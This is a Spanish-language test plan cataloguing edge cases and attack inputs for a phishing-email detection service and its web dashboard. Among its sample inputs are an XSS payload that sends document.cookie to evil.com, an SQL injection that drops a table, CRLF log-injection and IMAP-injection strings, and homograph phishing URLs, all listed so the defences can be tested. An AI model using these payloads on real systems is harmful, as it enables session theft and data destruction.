# 🧪 Catálogo de Casos Borde (*Edge Cases*) y Plan de Pruebas de Seguridad

Este documento define la matriz exhaustiva de escenarios extremos, entradas malformadas y vectores de evasión a los que se someterá cada módulo del sistema mediante pruebas automatizadas con `pytest`. Cada identificador (`EC-*`) es trazable directamente hacia las funciones de prueba en el directorio `tests/`.

---

## 1. Evasión Léxica y Ofuscación en URLs (`EC-URL`)

| ID | Caso Borde / Vector de Evasión | Entrada de Prueba Representativa | Comportamiento Seguro Esperado |
| :--- | :--- | :--- | :--- |
| **EC-URL-01** | Ataque Homográfico IDN (Punycode) | `https://www.mаersk.com/login` (con `а` cirílica U+0430 $\rightarrow$ `xn--mersk-6qa.com`) | El parser normaliza a Punycode; NO coincide con `maersk.com` en lista blanca y dispara alerta heurística de homógrafo/*typosquatting*. |
| **EC-URL-02** | Credenciales Embebidas (`user@host`) | `https://seniat.gob.ve@evil-customs.ru/arancel` | El sistema identifica `evil-customs.ru` como el dominio real (no `seniat.gob.ve`) y penaliza severamente el uso de `@` en la autoridad de la URL. |
| **EC-URL-03** | Evasión de Lista Blanca por Subdominio Engañoso | `https://maersk.com.tracking-chacao.net/bl` y `https://fakemaersk.com` | La Capa 1 rechaza ambos como dominios en lista blanca (solo acepta `maersk.com` o `*.maersk.com`) y la Capa 3 evalúa el riesgo. |
| **EC-URL-04** | Direcciones IP Literales (IPv4, IPv6 y Privadas) | `http://45.33.32.156/guia.pdf`, `http://[2001:db8::1]/login`, `http://127.0.0.1:8080/admin` | Detección inmediata de host basado en IP ($+40\text{ pts}$), sin realizar ninguna conexión de red (prevención total de SSRF). |
| **EC-URL-05** | Esquemas Peligrosos o No HTTP(S) | `javascript:alert(document.domain)`, `data:text/html;base64,...`, `vbscript:msgbox(1)` | Bloqueo y penalización crítica en heurística; jamás se envían a VirusTotal ni se renderizan como enlaces activos. |
| **EC-URL-06** | Longitud Extrema (Intento de ReDoS / Buffer) | URL válida seguida de $50\,000\text{ caracteres}$ `'A'` en el *query string*. | Procesamiento en tiempo lineal ($< 50\text{ ms}$) sin bloqueo de CPU; truncamiento o rechazo controlado al superar $2048\text{ caracteres}$. |
| **EC-URL-07** | Puertos No Estándar en Enlaces Corporativos | `http://aduanas-ve.org:8443/pago-urgente` | Extracción limpia del dominio sin el puerto (`aduanas-ve.org`) para consultas de reputación y suma de riesgo heurístico por puerto inusual. |
| **EC-URL-08** | Mayúsculas Mixtas, Espacios y Fragmentos | `  HTTPS://BIT.LY/GuiaRetenida#seccion1  ` | Limpieza de espacios, normalización del esquema/host a minúsculas (`bit.ly`) preservando sensibilidad de ruta (*path*) para VirusTotal. |

---

## 2. Anomalías Estructurales en Correos MIME, HTML e IMAP (`EC-MIME`)

| ID | Caso Borde / Anomalía | Escenario Simulado | Comportamiento Seguro Esperado |
| :--- | :--- | :--- | :--- |
| **EC-MIME-01** | Ausencia de Cabecera `Message-ID` | Correo crudo sin el encabezado estándar `Message-ID`. | Generación determinista de un hash SHA-256 sustituto (basado en remitente, asunto, fecha y tamaño) para mantener idempotencia. |
| **EC-MIME-02** | Codificación de Caracteres Corrupta | Cuerpo declarado como `UTF-8` que contiene secuencias de bytes inválidas (`\xff\xfe`) o asuntos codificados en RFC 2047 roto. | Decodificación tolerante (`errors="replace"`) sin lanzar `UnicodeDecodeError` ni interrumpir el ciclo del monitor. |
| **EC-MIME-03** | Discrepancia Texto Visible vs. Destino (`href`) | `<a href="http://robo-credenciales.org">https://www.dhl.com/ve-es/tracking.html</a>` | El parser asocia ambos valores y la regla heurística `H2` suma $+45\text{ pts}$ al detectar dominios distintos entre texto y destino. |
| **EC-MIME-04** | Correo Exclusivamente HTML con DOM Malformado | Etiquetas `<a>` sin cerrar, atributos `href` vacíos (`<a href="">`) o enlaces `mailto:` y `tel:`. | Ignora `mailto:`/`tel:` y etiquetas vacías; extrae únicamente enlaces relevantes sin fallar ante HTML roto. |
| **EC-MIME-05** | Inundación de Enlaces en un Solo Correo (*Link Flood*) | Un correo con $150\text{ enlaces}$ repetidos o distintos para saturar la cola de VirusTotal. | Deduplicación exacta de URLs y aplicación de un límite máximo configurable de enlaces únicos analizados por mensaje. |
| **EC-MIME-06** | Intento de Inyección en Comandos IMAP | Nombre de carpeta o UID manipulado con caracteres `\r\n` o caracteres no numéricos. | Validación estricta de formato antes de enviar comandos `COPY`/`STORE` al socket SSL de IMAP; rechazo de UIDs no enteros. |

---

## 3. Resiliencia ante Servicios Externos y Base de Datos (`EC-EXT`)

| ID | Caso Borde / Fallo Externo | Condición Simulada (*Mocking*) | Comportamiento Seguro Esperado |
| :--- | :--- | :--- | :--- |
| **EC-EXT-01** | Límite de Cuota Excedido en VirusTotal (`HTTP 429`) | La API externa responde con código `429 Too Many Requests`. | El motor captura el estado, registra advertencia en logs sin colapsar y calcula el veredicto usando Capas 1 y 3 (*Graceful Degradation*). |
| **EC-EXT-02** | *Timeout* o Caída de Red en VirusTotal (`HTTP 5xx`) | El servidor externo tarda más del tiempo límite configurado o cierra la conexión. | `httpx.TimeoutException` controlada; el worker IMAP continúa operando dentro de su ventana normal sin congelarse. |
| **EC-EXT-03** | URL Nueva No Conocida por VirusTotal (`HTTP 404`) | Se consulta un dominio recién registrado por un atacante que aún no existe en la base de VirusTotal. | Se interpreta limpiamente como $0\text{ detecciones}$ en Capa 2 (no como error del sistema) y se delega el peso a la Capa 3 heurística. |
| **EC-EXT-04** | Concurrencia SQLite (Monitor IMAP + Dashboard Web) | Lecturas simultáneas desde FastAPI mientras el monitor inserta incidentes. | SQLite configurado con `PRAGMA journal_mode=WAL` y `busy_timeout`, evitando errores `OperationalError: database is locked`. |
| **EC-EXT-05** | Archivo Excesivo en Descarga de Feeds (*Stream Bomb*) | El endpoint de actualización devuelve un flujo de datos superior al límite de seguridad ($25\text{ MB}$). | Lectura por fragmentos (*streaming chunks*) que aborta la descarga de inmediato al superar el umbral de memoria permitido. |

---

## 4. Seguridad en API REST y Panel de Control Web (`EC-WEB`)

| ID | Caso Borde / Ataque Web | Payload de Prueba | Comportamiento Seguro Esperado |
| :--- | :--- | :--- | :--- |
| **EC-WEB-01** | *Blind Stored XSS* en Asunto, Remitente o URL | Asunto: `Factura <script>fetch('http://evil.com?c='+document.cookie)</script>` | El HTML entregado por el Dashboard escapa los caracteres (`&lt;script&gt;`) y la cabecera HTTP `Content-Security-Policy` bloquea scripts en línea. |
| **EC-WEB-02** | *SQL Injection* en Analizador Manual o Filtros | URL enviada: `http://test.com/' OR '1'='1'; DROP TABLE processed_emails;--` | El ORM trata la cadena literalmente como parámetro seguro; las tablas permanecen intactas. |
| **EC-WEB-03** | *Log Injection* mediante Caracteres CRLF | Remitente con `\r\n2026-11-24 INFO Correo marcado como LIMPIO`. | El sanitizador reemplaza `\r` y `\n` por espacios seguros antes de emitir la línea de log. |
| **EC-WEB-04** | Petición Malformada o Vacía al Endpoint `/analyze` | Envío de JSON vacío `{}`, tipos incorrectos (`{"url": 12345}`) o cadena de $10\,000\text{ caracteres}$. | Respuesta HTTP `422 Unprocessable Entity` gestionada por Pydantic sin exponer rutas internas del servidor. |